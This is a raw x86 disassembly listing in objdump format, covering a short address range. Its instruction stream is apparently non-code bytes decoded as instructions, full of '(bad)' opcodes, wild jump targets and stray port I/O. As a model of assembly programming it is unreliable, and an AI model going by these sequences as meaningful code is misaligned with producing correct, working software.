  43170d:	93                   	xchg   %eax,%ebx
  43170e:	d1 bb 2e bf 74 cc    	sarl   $1,-0x338b40d2(%ebx)
  431714:	7d df                	jge    0x4316f5
  431716:	f8                   	clc
  431717:	a3 8a 97 f6 b6       	mov    %eax,0xb6f6978a
  43171c:	b8 55 bc c5 59       	mov    $0x59c5bc55,%eax
  431721:	f7 27                	mull   (%edi)
  431723:	c5 ef 0d             	(bad)
  431726:	65 6e                	outsb  %gs:(%esi),(%dx)
  431728:	28 5d 76             	sub    %bl,0x76(%ebp)
  43172b:	72 e6                	jb     0x431713
  43172d:	cb                   	lret
  43172e:	76 6e                	jbe    0x43179e
  431730:	61                   	popa
  431731:	36 e3 b6             	ss jecxz 0x4316ea
  431734:	00 3f                	add    %bh,(%edi)
  431736:	e8 a8 9c 55 7b       	call   0x7b98b3e3
  43173b:	02 c6                	add    %dh,%al
  43173d:	dc f8                	fdivr  %st,%st(0)
  43173f:	e3 98                	jecxz  0x4316d9
  431741:	da f6                	(bad)
  431743:	2b 54 1a 2c          	sub    0x2c(%edx,%ebx,1),%edx
  431747:	a0 4c 68 b5 27       	mov    0x27b5684c,%al
  43174c:	23 5a b8             	and    -0x48(%edx),%ebx
  43174f:	c7                   	(bad)
  431750:	8d 03                	lea    (%ebx),%eax
  431752:	76 10                	jbe    0x431764
  431754:	e2 c5                	loop   0x43171b
  431756:	e8 ac 43 79 41       	call   0x41bc5b07
  43175b:	f2 26 f0 03 d0       	repnz es lock add %eax,%edx
  431760:	35 79 3e 01 f8       	xor    $0xf8013e79,%eax
  431765:	c1 4f 02 f4          	rorl   $0xf4,0x2(%edi)
  431769:	6b fd a1             	imul   $0xffffffa1,%ebp,%edi
  43176c:	7d 18                	jge    0x431786
  43176e:	74 13                	je     0x431783
  431770:	37                   	aaa
  431771:	5c                   	pop    %esp
  431772:	d4 d2                	aam    $0xd2
  431774:	30 be 79 ee b7 8f    	xor    %bh,-0x70481187(%esi)
  43177a:	13 46 82             	adc    -0x7e(%esi),%eax
  43177d:	e1 96                	loope  0x431715
  43177f:	93                   	xchg   %eax,%ebx
  431780:	d8 9b 8d 0f ad 78    	fcomps 0x78ad0f8d(%ebx)
  431786:	74 3f                	je     0x4317c7
  431788:	2b 5d fb             	sub    -0x5(%ebp),%ebx
  43178b:	50                   	push   %eax
  43178c:	9b                   	fwait
  43178d:	fc                   	cld
  43178e:	b8 68 65 5d 67       	mov    $0x675d6568,%eax
  431793:	d2 78 f7             	sarb   %cl,-0x9(%eax)
  431796:	1c f3                	sbb    $0xf3,%al
  431798:	68 10 49 a1 e6       	push   $0xe6a14910
  43179d:	22 80 a8 44 5c 29    	and    0x295c44a8(%eax),%al
  4317a3:	19 56 58             	sbb    %edx,0x58(%esi)
  4317a6:	02 1f                	add    (%edi),%bl
  4317a8:	e4 e4                	in     $0xe4,%al
  4317aa:	e9 3f 3f b2 82       	jmp    0x82f556ee
  4317af:	75 6d                	jne    0x43181e
  4317b1:	32 66 e3             	xor    -0x1d(%esi),%ah
  4317b4:	90                   	nop
  4317b5:	7c 5f                	jl     0x431816
  4317b7:	94                   	xchg   %eax,%esp
  4317b8:	bd 13 0a 23 a7       	mov    $0xa7230a13,%ebp
  4317bd:	7b b7                	jnp    0x431776
  4317bf:	02 01                	add    (%ecx),%al
  4317c1:	b4 bc                	mov    $0xbc,%ah
  4317c3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4317c4:	3c 69                	cmp    $0x69,%al
  4317c6:	bc fd ac 09 49       	mov    $0x4909acfd,%esp
  4317cb:	d6                   	salc
  4317cc:	ef                   	out    %eax,(%dx)
  4317cd:	40                   	inc    %eax
  4317ce:	86 0d 86 42 ba 8a    	xchg   %cl,0x8aba4286
  4317d4:	fc                   	cld
  4317d5:	d6                   	salc
  4317d6:	74 91                	je     0x431769
  4317d8:	59                   	pop    %ecx
  4317d9:	83 4f a7 15          	orl    $0x15,-0x59(%edi)
  4317dd:	cc                   	int3
  4317de:	63 e7                	arpl   %esp,%edi
  4317e0:	88 9a 5f d9 e3 3f    	mov    %bl,0x3fe3d95f(%edx)
  4317e6:	e8 1a 88 78 4f       	call   0x4fbba005
  4317eb:	ab                   	stos   %eax,%es:(%edi)
  4317ec:	2a ef                	sub    %bh,%ch
  4317ee:	85 09                	test   %ecx,(%ecx)
  4317f0:	46                   	inc    %esi
  4317f1:	f5                   	cmc
  4317f2:	0b 37                	or     (%edi),%esi
  4317f4:	e4 7f                	in     $0x7f,%al
  4317f6:	e4 fd                	in     $0xfd,%al
  4317f8:	d3 2d ca a0 2d d6    	shrl   %cl,0xd62da0ca
  4317fe:	e1 7b                	loope  0x43187b
  431800:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431801:	18 85 d2 65 31 1f    	sbb    %al,0x1f3165d2(%ebp)
  431807:	95                   	xchg   %eax,%ebp
  431808:	84 65 32             	test   %ah,0x32(%ebp)
  43180b:	15 d6 8f fb 08       	adc    $0x8fb8fd6,%eax
  431810:	91                   	xchg   %eax,%ecx
  431811:	95                   	xchg   %eax,%ebp
  431812:	96                   	xchg   %eax,%esi
  431813:	4b                   	dec    %ebx
  431814:	bd 1d e1 9d a3       	mov    $0xa39de11d,%ebp
  431819:	6c                   	insb   (%dx),%es:(%edi)
  43181a:	88 e2                	mov    %ah,%dl
  43181c:	c2 86 b0             	ret    $0xb086
  43181f:	4c                   	dec    %esp
  431820:	ce                   	into
  431821:	ca 58 09             	lret   $0x958
  431824:	7b 34                	jnp    0x43185a
  431826:	23 04 1b             	and    (%ebx,%ebx,1),%eax
  431829:	86 7c 22 df          	xchg   %bh,-0x21(%edx,%eiz,1)
  43182d:	cc                   	int3
  43182e:	fd                   	std
  43182f:	97                   	xchg   %eax,%edi
  431830:	e3 a2                	jecxz  0x4317d4
  431832:	3c fc                	cmp    $0xfc,%al
  431834:	cb                   	lret
  431835:	06                   	push   %es
  431836:	e0 98                	loopne 0x4317d0
  431838:	77 47                	ja     0x431881
  43183a:	ab                   	stos   %eax,%es:(%edi)
  43183b:	1a 24 8f             	sbb    (%edi,%ecx,4),%ah
  43183e:	24 64                	and    $0x64,%al
  431840:	3b 86 2d c5 37 a1    	cmp    -0x5ec83ad3(%esi),%eax
  431846:	49                   	dec    %ecx
  431847:	01 a9 ff 9f e5 40    	add    %ebp,0x40e59fff(%ecx)
  43184d:	e6 4a                	out    %al,$0x4a
  43184f:	fe 83 fb 1f b9 89    	incb   -0x7646e005(%ebx)
  431855:	4e                   	dec    %esi
  431856:	e0 0b                	loopne 0x431863
  431858:	17                   	pop    %ss
  431859:	90                   	nop
  43185a:	49                   	dec    %ecx
  43185b:	ec                   	in     (%dx),%al
  43185c:	e0 d2                	loopne 0x431830
  43185e:	84 7f 5b             	test   %bh,0x5b(%edi)
  431861:	54                   	push   %esp
  431862:	ac                   	lods   %ds:(%esi),%al
  431863:	c2 77 27             	ret    $0x2777
  431866:	bb 7e 33 d7 93       	mov    $0x93d7337e,%ebx
  43186b:	84 a1 a0 98 25 36    	test   %ah,0x362598a0(%ecx)
  431871:	06                   	push   %es
  431872:	8f                   	(bad)
  431873:	17                   	pop    %ss
  431874:	30 d2                	xor    %dl,%dl
  431876:	8b a4 34 0d d4 2a 46 	mov    0x462ad40d(%esp,%esi,1),%esp
  43187d:	6d                   	insl   (%dx),%es:(%edi)
  43187e:	86 5f 09             	xchg   %bl,0x9(%edi)
  431881:	41                   	inc    %ecx
  431882:	dd f9                	(bad)
  431884:	1d 24 07 85 26       	sbb    $0x26850724,%eax
  431889:	98                   	cwtl
  43188a:	8d                   	lea    (bad),%ebp
  43188b:	eb 68                	jmp    0x4318f5
  43188d:	9c                   	pushf
  43188e:	79 30                	jns    0x4318c0
  431890:	66 7e 72             	data16 jle 0x431905
  431893:	55                   	push   %ebp
  431894:	22 e2                	and    %dl,%ah
  431896:	fb                   	sti
  431897:	b2 33                	mov    $0x33,%dl
  431899:	00 87 66 7b 30 2d    	add    %al,0x2d307b66(%edi)
  43189f:	80 e3 62             	and    $0x62,%bl
  4318a2:	83 77 21 66          	xorl   $0x66,0x21(%edi)
  4318a6:	7c 3c                	jl     0x4318e4
  4318a8:	47                   	inc    %edi
  4318a9:	3c 03                	cmp    $0x3,%al
  4318ab:	6a 46                	push   $0x46
  4318ad:	90                   	nop
  4318ae:	49                   	dec    %ecx
  4318af:	55                   	push   %ebp
  4318b0:	1b 05 e8 61 98 21    	sbb    0x219861e8,%eax
  4318b6:	da 8e 6c 77 01 15    	fimull 0x1501776c(%esi)
  4318bc:	e5 d3                	in     $0xd3,%eax
  4318be:	98                   	cwtl
  4318bf:	08 9c 6d fa 28 9c 81 	or     %bl,-0x7e63d706(%ebp,%ebp,2)
  4318c6:	61                   	popa
  4318c7:	03 b2 20 c7 cc dd    	add    -0x223338e0(%edx),%esi
  4318cd:	11 53 2b             	adc    %edx,0x2b(%ebx)
  4318d0:	f7 52 47             	notl   0x47(%edx)
  4318d3:	ad                   	lods   %ds:(%esi),%eax
  4318d4:	de e4                	fsubp  %st,%st(4)
  4318d6:	99                   	cltd
  4318d7:	14 f3                	adc    $0xf3,%al
  4318d9:	46                   	inc    %esi
  4318da:	78 27                	js     0x431903
  4318dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4318dd:	7b 25                	jnp    0x431904
  4318df:	bc 9a f6 b4 41       	mov    $0x41b4f69a,%esp
  4318e4:	05 4f e1 e0 c1       	add    $0xc1e0e14f,%eax
  4318e9:	aa                   	stos   %al,%es:(%edi)
  4318ea:	07                   	pop    %es
  4318eb:	ed                   	in     (%dx),%eax
  4318ec:	a3 38 ce 7c cf       	mov    %eax,0xcf7cce38
  4318f1:	38 23                	cmp    %ah,(%ebx)
  4318f3:	c8 2f 02 11          	enter  $0x22f,$0x11
  4318f7:	29 33                	sub    %esi,(%ebx)
  4318f9:	e1 80                	loope  0x43187b
  4318fb:	90                   	nop
  4318fc:	03 06                	add    (%esi),%eax
  4318fe:	63 03                	arpl   %eax,(%ebx)
  431900:	86 c5                	xchg   %al,%ch
  431902:	70 65                	jo     0x431969
  431904:	c3                   	ret
  431905:	0d 77 1b 55 5c       	or     $0x5c551b77,%eax
  43190a:	bd c2 6d 30 7d       	mov    $0x7d306dc2,%ebp
  43190f:	22 5d dc             	and    -0x24(%ebp),%bl
  431912:	10 80 ea 1f 8a a6    	adc    %al,-0x5975e016(%eax)
  431918:	73 a4                	jae    0x4318be
  43191a:	64 ec                	fs in  (%dx),%al
  43191c:	96                   	xchg   %eax,%esi
  43191d:	c8 75 d7 ca          	enter  $0xd775,$0xca
  431921:	78 63                	js     0x431986
  431923:	89 41 f6             	mov    %eax,-0xa(%ecx)
  431926:	0c e6                	or     $0xe6,%al
  431928:	e5 07                	in     $0x7,%eax
  43192a:	b2 1a                	mov    $0x1a,%dl
  43192c:	24 ff                	and    $0xff,%al
  43192e:	07                   	pop    %es
  43192f:	b2 e8                	mov    $0xe8,%dl
  431931:	78 42                	js     0x431975
  431933:	81 a9 07 27 60 af 67 	subl   $0x3ea2c167,-0x509fd8f9(%ecx)
  43193a:	c1 a2 3e 
  43193d:	bb 38 b0 1c 97       	mov    $0x971cb038,%ebx
  431942:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431943:	c0 62 8b b4          	shlb   $0xb4,-0x75(%edx)
  431947:	06                   	push   %es
  431948:	fe ca                	dec    %dl
  43194a:	9a 38 8d 88 e6 6d ad 	lcall  $0xad6d,$0xe6888d38
  431951:	09 15 b3 e5 97 36    	or     %edx,0x3697e5b3
  431957:	4a                   	dec    %edx
  431958:	c4 9e 0f d0 2c 44    	les    0x442cd00f(%esi),%ebx
  43195e:	40                   	inc    %eax
  43195f:	f1                   	int1
  431960:	6e                   	outsb  %ds:(%esi),(%dx)
  431961:	63 cb                	arpl   %ecx,%ebx
  431963:	ce                   	into
  431964:	32 50 f6             	xor    -0xa(%eax),%dl
  431967:	cc                   	int3
  431968:	b2 26                	mov    $0x26,%dl
  43196a:	68 fc 1e b3 47       	push   $0x47b31efc
  43196f:	36 c4 1a             	les    %ss:(%edx),%ebx
  431972:	74 91                	je     0x431905
  431974:	22 df                	and    %bh,%bl
  431976:	25 15 80 94 3a       	and    $0x3a948015,%eax
  43197b:	f5                   	cmc
  43197c:	4e                   	dec    %esi
  43197d:	e8 1b 5d 1a d4       	call   0xd45d769d
  431982:	33 76 c0             	xor    -0x40(%esi),%esi
  431985:	12 a0 3a 5a 08 58    	adc    0x58085a3a(%eax),%ah
  43198b:	f3 8b 71 38          	repz mov 0x38(%ecx),%esi
  43198f:	5a                   	pop    %edx
  431990:	b6 39                	mov    $0x39,%dh
  431992:	9b                   	fwait
  431993:	33 76 a1             	xor    -0x5f(%esi),%esi
  431996:	b2 82                	mov    $0x82,%dl
  431998:	ab                   	stos   %eax,%es:(%edi)
  431999:	3f                   	aas
  43199a:	5c                   	pop    %esp
  43199b:	f4                   	hlt
  43199c:	f8                   	clc
  43199d:	96                   	xchg   %eax,%esi
  43199e:	09 e8                	or     %ebp,%eax
  4319a0:	6c                   	insb   (%dx),%es:(%edi)
  4319a1:	78 f1                	js     0x431994
  4319a3:	e7 58                	out    %eax,$0x58
  4319a5:	a8 25                	test   $0x25,%al
  4319a7:	9d                   	popf
  4319a8:	b4 4a                	mov    $0x4a,%ah
  4319aa:	7d 55                	jge    0x431a01
  4319ac:	bd 8d 11 c3 37       	mov    $0x37c3118d,%ebp
  4319b1:	d1 d5                	rcl    $1,%ebp
  4319b3:	76 0f                	jbe    0x4319c4
  4319b5:	30 02                	xor    %al,(%edx)
  4319b7:	3d cd 13 27 d6       	cmp    $0xd62713cd,%eax
  4319bc:	64 c9                	fs leave
  4319be:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4319bf:	3b ac ed cc a0 6d 22 	cmp    0x226da0cc(%ebp,%ebp,8),%ebp
  4319c6:	ff 19                	lcall  *(%ecx)
  4319c8:	03 50 27             	add    0x27(%eax),%edx
  4319cb:	13 3d dc 54 c6 79    	adc    0x79c654dc,%edi
  4319d1:	86 09                	xchg   %cl,(%ecx)
  4319d3:	4f                   	dec    %edi
  4319d4:	ea a3 67 39 35 93 45 	ljmp   $0x4593,$0x353967a3
  4319db:	58                   	pop    %eax
  4319dc:	06                   	push   %es
  4319dd:	17                   	pop    %ss
  4319de:	ae                   	scas   %es:(%edi),%al
  4319df:	e2 ba                	loop   0x43199b
  4319e1:	65 11 d1             	gs adc %edx,%ecx
  4319e4:	82 94 91 c1 64 5b 63 	adcb   $0x87,0x635b64c1(%ecx,%edx,4)
  4319eb:	87 
  4319ec:	e1 a8                	loope  0x431996
  4319ee:	88 c9                	mov    %cl,%cl
  4319f0:	e0 4c                	loopne 0x431a3e
  4319f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4319f3:	8f                   	(bad)
  4319f4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4319f5:	5a                   	pop    %edx
  4319f6:	3f                   	aas
  4319f7:	0e                   	push   %cs
  4319f8:	db 42 51             	fildl  0x51(%edx)
  4319fb:	12 d9                	adc    %cl,%bl
  4319fd:	fc                   	cld
  4319fe:	c9                   	leave
  4319ff:	58                   	pop    %eax
  431a00:	45                   	inc    %ebp
  431a01:	02 ed                	add    %ch,%ch
  431a03:	7c 58                	jl     0x431a5d
  431a05:	b0 0b                	mov    $0xb,%al
  431a07:	a2 27 ea 28 32       	mov    %al,0x3228ea27
  431a0c:	b5 6a                	mov    $0x6a,%ch
  431a0e:	3c 16                	cmp    $0x16,%al
  431a10:	27                   	daa
  431a11:	df 1f                	fistps (%edi)
  431a13:	14 23                	adc    $0x23,%al
  431a15:	44                   	inc    %esp
  431a16:	ae                   	scas   %es:(%edi),%al
  431a17:	9a 69 21 63 35 38 5a 	lcall  $0x5a38,$0x35632169
  431a1e:	93                   	xchg   %eax,%ebx
  431a1f:	fa                   	cli
  431a20:	1f                   	pop    %ds
  431a21:	01 5b b0             	add    %ebx,-0x50(%ebx)
  431a24:	2b 07                	sub    (%edi),%eax
  431a26:	9f                   	lahf
  431a27:	d0 6b 5b             	shrb   $1,0x5b(%ebx)
  431a2a:	52                   	push   %edx
  431a2b:	28 93 c2 a8 d8 53    	sub    %dl,0x53d8a8c2(%ebx)
  431a31:	d4 1c                	aam    $0x1c
  431a33:	cd d4                	int    $0xd4
  431a35:	08 9a 75 d6 ac 0b    	or     %bl,0xbacd675(%edx)
  431a3b:	df 96 ac ba 1d 5b    	fists  0x5b1dbaac(%esi)
  431a41:	95                   	xchg   %eax,%ebp
  431a42:	3e 1f                	ds pop %ds
  431a44:	c3                   	ret
  431a45:	ba 65 0f a3 50       	mov    $0x50a30f65,%edx
  431a4a:	61                   	popa
  431a4b:	5e                   	pop    %esi
  431a4c:	3c 03                	cmp    $0x3,%al
  431a4e:	b3 ef                	mov    $0xef,%bl
  431a50:	c6 82 9d 57 c7 fd 66 	movb   $0x66,-0x238a863(%edx)
  431a57:	fb                   	sti
  431a58:	8b b5 2a c5 22 16    	mov    0x1622c52a(%ebp),%esi
  431a5e:	0f c5                	pextrw $0xc5,(bad),%esi
  431a60:	30 5c 97 4a          	xor    %bl,0x4a(%edi,%edx,4)
  431a64:	5d                   	pop    %ebp
  431a65:	10 48 54             	adc    %cl,0x54(%eax)
  431a68:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431a69:	87 90 02 0a f9 dc    	xchg   %edx,-0x2306f5fe(%eax)
  431a6f:	db 0d 01 c0 d1 a9    	fisttpl 0xa9d1c001
  431a75:	5b                   	pop    %ebx
  431a76:	50                   	push   %eax
  431a77:	9e                   	sahf
  431a78:	9d                   	popf
  431a79:	82 d3 83             	adc    $0x83,%bl
  431a7c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431a7d:	29 83 8b 85 96 d4    	sub    %eax,-0x2b697a75(%ebx)
  431a83:	52                   	push   %edx
  431a84:	54                   	push   %esp
  431a85:	e5 76                	in     $0x76,%eax
  431a87:	7e 7d                	jle    0x431b06
  431a89:	44                   	inc    %esp
  431a8a:	a8 6e                	test   $0x6e,%al
  431a8c:	98                   	cwtl
  431a8d:	9e                   	sahf
  431a8e:	4f                   	dec    %edi
  431a8f:	0a 80 a4 65 51 0d    	or     0xd5165a4(%eax),%al
  431a95:	8a 56 df             	mov    -0x21(%esi),%dl
  431a98:	9f                   	lahf
  431a99:	d1 15 a4 db 04 21    	rcll   $1,0x2104dba4
  431a9f:	13 b4 df a5 af 79 0f 	adc    0xf79afa5(%edi,%ebx,8),%esi
  431aa6:	e0 32                	loopne 0x431ada
  431aa8:	b0 95                	mov    $0x95,%al
  431aaa:	66 10 83 a0 d4 35 54 	data16 adc %al,0x5435d4a0(%ebx)
  431ab1:	a0 1d 32 0c f7       	mov    0xf70c321d,%al
  431ab6:	ca 7d 8a             	lret   $0x8a7d
  431ab9:	89 05 98 cb ba 7f    	mov    %eax,0x7fbacb98
  431abf:	3a 66 fe             	cmp    -0x2(%esi),%ah
  431ac2:	b3 f5                	mov    $0xf5,%bl
  431ac4:	de 01                	fiadds (%ecx)
  431ac6:	8e b2 3e fb 33 96    	mov    -0x69cc04c2(%edx),%?
  431acc:	d4 77                	aam    $0x77
  431ace:	98                   	cwtl
  431acf:	7e b2                	jle    0x431a83
  431ad1:	8a cb                	mov    %bl,%cl
  431ad3:	bc 64 05 33 f8       	mov    $0xf8330564,%esp
  431ad8:	75 f7                	jne    0x431ad1
  431ada:	bb 13 7b ed b4       	mov    $0xb4ed7b13,%ebx
  431adf:	33 df                	xor    %edi,%ebx
  431ae1:	c0 b5 37 23 95 b6 3f 	shlb   $0x3f,-0x496adcc9(%ebp)
  431ae8:	4a                   	dec    %edx
  431ae9:	04 a6                	add    $0xa6,%al
  431aeb:	4d                   	dec    %ebp
  431aec:	cd 2e                	int    $0x2e
  431aee:	fd                   	std
  431aef:	3a f0                	cmp    %al,%dh
  431af1:	f5                   	cmc
  431af2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431af3:	63 08                	arpl   %ecx,(%eax)
  431af5:	c7                   	(bad)
  431af6:	4a                   	dec    %edx
  431af7:	b9 60 5b 63 26       	mov    $0x26635b60,%ecx
  431afc:	9d                   	popf
  431afd:	1c db                	sbb    $0xdb,%al
  431aff:	71 31                	jno    0x431b32
  431b01:	ae                   	scas   %es:(%edi),%al
  431b02:	8e 7d 53             	mov    0x53(%ebp),%?
  431b05:	1e                   	push   %ds
  431b06:	aa                   	stos   %al,%es:(%edi)
  431b07:	d4 bf                	aam    $0xbf
  431b09:	44                   	inc    %esp
  431b0a:	03 c7                	add    %edi,%eax
  431b0c:	08 a9 f9 1e 3a af    	or     %ch,-0x50c5e107(%ecx)
  431b12:	f3 9d                	repz popf
  431b14:	6d                   	insl   (%dx),%es:(%edi)
  431b15:	b1 d2                	mov    $0xd2,%cl
  431b17:	04 72                	add    $0x72,%al
  431b19:	de 6c ff 1d          	fisubrs 0x1d(%edi,%edi,8)
  431b1d:	5d                   	pop    %ebp
  431b1e:	f5                   	cmc
  431b1f:	ef                   	out    %eax,(%dx)
  431b20:	bc 85 ed 8c 78       	mov    $0x788ced85,%esp
  431b25:	55                   	push   %ebp
  431b26:	52                   	push   %edx
  431b27:	78 96                	js     0x431abf
  431b29:	96                   	xchg   %eax,%esi
  431b2a:	c1 33 55             	shll   $0x55,(%ebx)
  431b2d:	1e                   	push   %ds
  431b2e:	6b 05 02 d7 ed 72 ca 	imul   $0xffffffca,0x72edd702,%eax
  431b35:	5a                   	pop    %edx
  431b36:	7c 6a                	jl     0x431ba2
  431b38:	b3 1d                	mov    $0x1d,%bl
  431b3a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431b3b:	ef                   	out    %eax,(%dx)
  431b3c:	b3 fc                	mov    $0xfc,%bl
  431b3e:	f8                   	clc
  431b3f:	0f 2c e6             	cvttps2pi %xmm6,%mm4
  431b42:	eb b7                	jmp    0x431afb
  431b44:	4c                   	dec    %esp
  431b45:	49                   	dec    %ecx
  431b46:	3b ce                	cmp    %esi,%ecx
  431b48:	71 51                	jno    0x431b9b
  431b4a:	80 d0 0b             	adc    $0xb,%al
  431b4d:	3d 7a 27 54 54       	cmp    $0x5454277a,%eax
  431b52:	3e f7 1f             	negl   %ds:(%edi)
  431b55:	ae                   	scas   %es:(%edi),%al
  431b56:	6f                   	outsl  %ds:(%esi),(%dx)
  431b57:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431b58:	ef                   	out    %eax,(%dx)
  431b59:	30 25 a9 af 2b 81    	xor    %ah,0x812bafa9
  431b5f:	d5 d7                	aad    $0xd7
  431b61:	56                   	push   %esi
  431b62:	ff 25 cf 88 a9 e3    	jmp    *0xe3a988cf
  431b68:	05 90 8b 65 47       	add    $0x47658b90,%eax
  431b6d:	76 d0                	jbe    0x431b3f
  431b6f:	9a a1 44 06 2c 20 45 	lcall  $0x4520,$0x2c0644a1
  431b76:	cd af                	int    $0xaf
  431b78:	5d                   	pop    %ebp
  431b79:	58                   	pop    %eax
  431b7a:	b7 32                	mov    $0x32,%bh
  431b7c:	99                   	cltd
  431b7d:	4b                   	dec    %ebx
  431b7e:	e2 fd                	loop   0x431b7d
  431b80:	9f                   	lahf
  431b81:	c4 aa a9 12 c3 1e    	les    0x1ec312a9(%edx),%ebp
  431b87:	ab                   	stos   %eax,%es:(%edi)
  431b88:	f7 c4 78 26 79 12    	test   $0x12792678,%esp
  431b8e:	8c 45 d5             	mov    %es,-0x2b(%ebp)
  431b91:	a2 59 94 b6 95       	mov    %al,0x95b69459
  431b96:	87 38                	xchg   %edi,(%eax)
  431b98:	9b                   	fwait
  431b99:	4f                   	dec    %edi
  431b9a:	ac                   	lods   %ds:(%esi),%al
  431b9b:	45                   	inc    %ebp
  431b9c:	d2 20                	shlb   %cl,(%eax)
  431b9e:	88 af ce 93 12 d2    	mov    %ch,-0x2ded6c32(%edi)
  431ba4:	f7 9b 02 7d 3e 8f    	negl   -0x70c182fe(%ebx)
  431baa:	dd 78 63             	fnstsw 0x63(%eax)
  431bad:	21 a0 0a 40 e7 bc    	and    %esp,-0x4318bff6(%eax)
  431bb3:	83 0b 4d             	orl    $0x4d,(%ebx)
  431bb6:	18 17                	sbb    %dl,(%edi)
  431bb8:	98                   	cwtl
  431bb9:	bf a8 51 7f 74       	mov    $0x747f51a8,%edi
  431bbe:	35 73 ae 7c c9       	xor    $0xc97cae73,%eax
  431bc3:	2c 9a                	sub    $0x9a,%al
  431bc5:	3a 8e 7a c9 e9 ae    	cmp    -0x51163686(%esi),%cl
  431bcb:	7c b1                	jl     0x431b7e
  431bcd:	cf                   	iret
  431bce:	bb 91 a3 cb 97       	mov    $0x97cba391,%ebx
  431bd3:	55                   	push   %ebp
  431bd4:	36 97                	ss xchg %eax,%edi
  431bd6:	56                   	push   %esi
  431bd7:	57                   	push   %edi
  431bd8:	b2 ea                	mov    $0xea,%dl
  431bda:	e8 f3 59 9f 02       	call   0x2e275d2
  431bdf:	b0 b3                	mov    $0xb3,%al
  431be1:	76 64                	jbe    0x431c47
  431be3:	dd e2                	fucom  %st(2)
  431be5:	d9 7d eb             	fnstcw -0x15(%ebp)
  431be8:	52                   	push   %edx
  431be9:	6c                   	insb   (%dx),%es:(%edi)
  431bea:	99                   	cltd
  431beb:	bb a3 0d 2c 2a       	mov    $0x2a2c0da3,%ebx
  431bf0:	a1 89 71 28 4b       	mov    0x4b287189,%eax
  431bf5:	67 c3                	addr16 ret
  431bf7:	3b b5 b8 67 14 77    	cmp    0x771467b8(%ebp),%esi
  431bfd:	a9 8e fd dd a1       	test   $0xa1ddfd8e,%eax
  431c02:	03 58 c0             	add    -0x40(%eax),%ebx
  431c05:	20 2f                	and    %ch,(%edi)
  431c07:	36 56                	ss push %esi
  431c09:	ae                   	scas   %es:(%edi),%al
  431c0a:	48                   	dec    %eax
  431c0b:	3a 2d d7 ef d4 72    	cmp    0x72d4efd7,%ch
  431c11:	d1 36                	shll   $1,(%esi)
  431c13:	37                   	aaa
  431c14:	de 0e                	fimuls (%esi)
  431c16:	60                   	pusha
  431c17:	e4 69                	in     $0x69,%al
  431c19:	24 76                	and    $0x76,%al
  431c1b:	df 1f                	fistps (%edi)
  431c1d:	39 d2                	cmp    %edx,%edx
  431c1f:	87 a8 ca 78 1d fe    	xchg   %ebp,-0x1e28736(%eax)
  431c25:	79 b3                	jns    0x431bda
  431c27:	98                   	cwtl
  431c28:	bc 5b cf b7 68       	mov    $0x68b7cf5b,%esp
  431c2d:	39 7d 73             	cmp    %edi,0x73(%ebp)
  431c30:	5f                   	pop    %edi
  431c31:	3e dd 95 da 5b 40 ab 	fstl   %ds:-0x54bfa426(%ebp)
  431c38:	fd                   	std
  431c39:	c0 28 ba             	shrb   $0xba,(%eax)
  431c3c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431c3d:	d0 81 6a 70 47 8a    	rolb   $1,-0x75b88f96(%ecx)
  431c43:	b2 84                	mov    $0x84,%dl
  431c45:	48                   	dec    %eax
  431c46:	60                   	pusha
  431c47:	ce                   	into
  431c48:	2b 07                	sub    (%edi),%eax
  431c4a:	38 66 02             	cmp    %ah,0x2(%esi)
  431c4d:	4d                   	dec    %ebp
  431c4e:	a0 22 a7 94 0b       	mov    0xb94a722,%al
  431c53:	82 26 ff             	andb   $0xff,(%esi)
  431c56:	60                   	pusha
  431c57:	89 25 39 ad 96 73    	mov    %esp,0x7396ad39
  431c5d:	47                   	inc    %edi
  431c5e:	cf                   	iret
  431c5f:	1f                   	pop    %ds
  431c60:	50                   	push   %eax
  431c61:	7d 42                	jge    0x431ca5
  431c63:	a1 d7 ce e5 92       	mov    0x92e5ced7,%eax
  431c68:	21 8a 85 a6 5f 68    	and    %ecx,0x685fa685(%edx)
  431c6e:	87 c9                	xchg   %ecx,%ecx
  431c70:	a9 fc 38 c4 77       	test   $0x77c438fc,%eax
  431c75:	22 eb                	and    %bl,%ch
  431c77:	68 23 26 7e 79       	push   $0x797e2623
  431c7c:	c5 5e b4             	lds    -0x4c(%esi),%ebx
  431c7f:	ae                   	scas   %es:(%edi),%al
  431c80:	11 4a c8             	adc    %ecx,-0x38(%edx)
  431c83:	bb b9 09 18 69       	mov    $0x691809b9,%ebx
  431c88:	bc ea b0 23 5d       	mov    $0x5d23b0ea,%esp
  431c8d:	7b 0e                	jnp    0x431c9d
  431c8f:	9a d9 f2 58 da 40 42 	lcall  $0x4240,$0xda58f2d9
  431c96:	dc c7                	fadd   %st,%st(7)
  431c98:	3b c3                	cmp    %ebx,%eax
  431c9a:	e3 4c                	jecxz  0x431ce8
  431c9c:	01 f8                	add    %edi,%eax
  431c9e:	cc                   	int3
  431c9f:	d2 b8 4b 1f e7 0f    	sarb   %cl,0xfe71f4b(%eax)
  431ca5:	fc                   	cld
  431ca6:	dd bd dc 5e 8e 3d    	fnstsw 0x3d8e5edc(%ebp)
  431cac:	83 73 e1 d1          	xorl   $0xffffffd1,-0x1f(%ebx)
  431cb0:	5c                   	pop    %esp
  431cb1:	89 f4                	mov    %esi,%esp
  431cb3:	83 6f a4 66          	subl   $0x66,-0x5c(%edi)
  431cb7:	ce                   	into
  431cb8:	47                   	inc    %edi
  431cb9:	a9 90 82 94 82       	test   $0x82948290,%eax
  431cbe:	0f a1                	pop    %fs
  431cc0:	14 74                	adc    $0x74,%al
  431cc2:	4e                   	dec    %esi
  431cc3:	23 e7                	and    %edi,%esp
  431cc5:	8c ab 61 a0 a9 be    	mov    %gs,-0x41565f9f(%ebx)
  431ccb:	d1 12                	rcll   $1,(%edx)
  431ccd:	31 73 06             	xor    %esi,0x6(%ebx)
  431cd0:	7f 3e                	jg     0x431d10
  431cd2:	62 01                	bound  %eax,(%ecx)
